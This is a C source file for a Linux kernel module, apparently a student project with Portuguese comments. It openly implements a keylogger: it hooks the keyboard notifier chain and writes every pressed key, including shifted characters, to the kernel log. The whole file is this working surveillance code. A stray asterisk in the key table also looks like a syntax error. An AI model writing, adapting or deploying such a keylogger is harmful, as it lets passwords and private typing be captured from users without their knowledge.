#include <linux/init.h>
#include <linux/kernel.h>   
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define final_key 126

MODULE_AUTHOR("Luis Otavio O.C, Pedro P.");
MODULE_LICENSE("Dual BSD/GPL");
MODULE_DESCRIPTION("Um keylogger básico.");
 

// mapeando as teclas do teclado de acordo com scancode
static const char *teclado[][2] = {
	{"\0", "\0"}, 						//0
	{"_ESC_", "_ESC_"}, *
	{"1", "!"}, 
	{"2", "@"},       
	{"3", "#"}, 
	{"4", "$"}, 
	{"5", "%"}, 
	{"6", "¨"},                 
	{"7", "&"}, 
	{"8", "*"}, 
	{"9", "("}, 						//10
	{"0", ")"},                 
	{"-", "_"}, 
	{"=", "+"}, 
	{"_BACKSPACE_", "_BACKSPACE_"},         
	{"_TAB_", "_TAB_"}, 
	{"q", "Q"}, 
	{"w", "W"}, 
	{"e", "E"}, 
	{"r", "R"},
	{"t", "T"}, 						//20
	{"y", "Y"}, 
	{"u", "U"}, 
	{"i", "I"},                 
	{"o", "O"}, 
	{"p", "P"},
	{"´", "`"}, 
	{"[", "{"},                  
	{"\n", "\n"}, 
	{"_CTRL_E", "_CTRL_E"}, 
	{"a", "A"}, 						//30
	{"s", "S"},   
	{"d", "D"}, 
	{"f", "F"}, 
	{"g", "G"}, 
	{"h", "H"},                 
	{"j", "J"}, 
	{"k", "K"}, 
	{"l", "L"}, 
	{"ç", "Ç"},                 
	{"~", "^"}, 						//40
	{"'", "\""}, 
	{"_SHIFT_E", "_SHIFT_E"}, 
	{"]", "}"}, 
	{"z", "Z"}, 
	{"x", "X"}, 
	{"c", "C"}, 
	{"v", "V"},                 
	{"b", "B"}, 
	{"n", "N"}, 
	{"m", "M"}, 						//50
	{",", "<"},                 
	{".", ">"}, 
	{";", ":"}, 
	{"_SHIFT_D", "_SHIFT_D"}, 
	{"_KPD*_", "_KPD*_"},
	{"_ALT_E", "_ALT_E"}, 
	{" ", " "}, 
	{"_CAPS_", "_CAPS_"}, 
	{"F1", "F1"},
	{"F2", "F2"}, 						//60
	{"F3", "F3"}, 
	{"F4", "F4"}, 
	{"F5", "F5"},         
	{"F6", "F6"}, 
	{"F7", "F7"}, 
	{"F8", "F8"}, 
	{"F9", "F9"},         
	{"F10", "F10"}, 
	{"_NUMLOCK_", "_NUMLOCK_"}, 
	{"_SCROLL_", "_SCROLL_"},   		//70
	{"_KPD7_", "_HOME_"}, 
	{"_KPD8_", "_UP_"}, 
	{"_KPD9_", "_PGUP_"}, 
	{"-", "-"}, 
	{"_KPD4_", "_LEFT_"}, 
	{"_KPD5_", "_KPD5_"},         
	{"_KPD6_", "_RIGHT_"}, 
	{"+", "+"}, 
	{"_KPD1_", "_END_"},         
	{"_KPD2_", "_DOWN_"}, 				//80
	{"_KPD3_", "_PGDN"}, 
	{"_KPD0_", "_INSERT_"}, 
	{"_KPD._", "_DELETE_"}, 
	{"_PRTSCR_", "_PRTSCR_"}, 
	{"\0", "\0"},      
	{"\\", "|"}, 
	{"F11", "F11"}, 
	{"F12", "F12"}, 
	{"/", "?"},     
	{"\0", "\0"}, 						//90
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"},
	{"\0", "\0"}, 
	{"_KPDENTER_", "_KPDENTER_"}, 
	{"_CTRL_D", "_CTRL_D"}, 
	{"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, 
	{"_ALTGR_", "_ALTGR_"}, 				//100
	{"\0", "\0"},   
	{"_HOME_", "_HOME_"}, 
	{"_UP_", "_UP_"}, 
	{"_PGUP_", "_PGUP_"},   
	{"_LEFT_", "_LEFT_"}, 
	{"_RIGHT_", "_RIGHT_"}, 
	{"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, 
	{"_PGDN", "_PGDN"}, 
	{"_INS_", "_INS_"},   				//110
	{"_DEL_", "_DEL_"}, 
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"},   
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"}, 
	{"\0", "\0"},         
	{"_PAUSE_", "_PAUSE_"},           	//119             
};

// converter o código da tecla para uma string
void converte_code(int keycode, int shift_mask)
{
	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) { // se está no intervalo de teclas permitidas
		const char *tecla = teclado[keycode][shift_mask]; //pegando a tecla na posição da matriz, se está com shift ativado ou não
		printk(KERN_INFO "%s\n", tecla); //escrevendo a tecla digitada
	}
}

// função para chamar o tradutor de tecla
int callback(struct notifier_block *bloco, unsigned long code, void *_parametro)
{
	struct keyboard_notifier_param *param = _parametro; //estrutura para detectar eventos do teclado

	// executar somente quando uma tecla for pressionada e o código vier como inteiro
	if (param->down && code == KBD_KEYCODE){
		converte_code(param->value, param->shift); //passando o keycode e se o sifht esta pressionado
	}
	
	return NOTIFY_OK; //Notificação bem sucedida
}

//definindo função a ser chamada quando houver uma notificação de um evento
static struct notifier_block notificador =
{
    .notifier_call = callback
};

// função para inciar o módulo
static int __init iniciar(void)
{
	// escrevendo mensagem no /var/log/kern.log
	printk(KERN_INFO "Inicializando o keylogger\n"); //escrever mensagem de informação
	register_keyboard_notifier(&notificador); //adicionado o notificador à lista de eventos do teclado, para chamar a callback quando um evento ocorrer
	return 0;
}
 
// função para encerrar o módulo
static void __exit finalizar(void)
{
	unregister_keyboard_notifier(&notificador);
	printk(KERN_INFO "Finalizando o keylogger\n");
}
 
module_init(iniciar); //inserir módulo no kernel
module_exit(finalizar); //remover módulo do kernel